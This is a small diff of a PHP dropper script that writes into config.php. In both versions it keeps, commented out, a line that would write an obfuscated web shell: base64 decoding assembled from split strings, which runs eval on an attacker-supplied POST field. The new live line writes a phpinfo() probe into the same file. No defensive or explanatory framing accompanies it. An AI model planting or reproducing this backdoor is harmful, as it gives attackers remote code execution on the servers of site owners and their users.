@@ -1,7 +1,6 @@
 <?php
-   phpinfo();
-   /*
    $fp = fopen("config.php",'w');
-   fwrite($fp,'<?php $x="BaSe64";$b="_deCOde";$c=$x.$b;@eval($cc = $c("ZXZhbCgkX1BPU1RbeGlhb21hXSk7"));?>');
-   */
+   fwrite($fp,'<?php phpinfo();?>');
+   //fwrite($fp,'<?php $x="BaSe64";$b="_deCOde";$c=$x.$b;@eval($cc = $c("ZXZhbCgkX1BPU1RbeGlhb21hXSk7"));?>');
+
 ?>
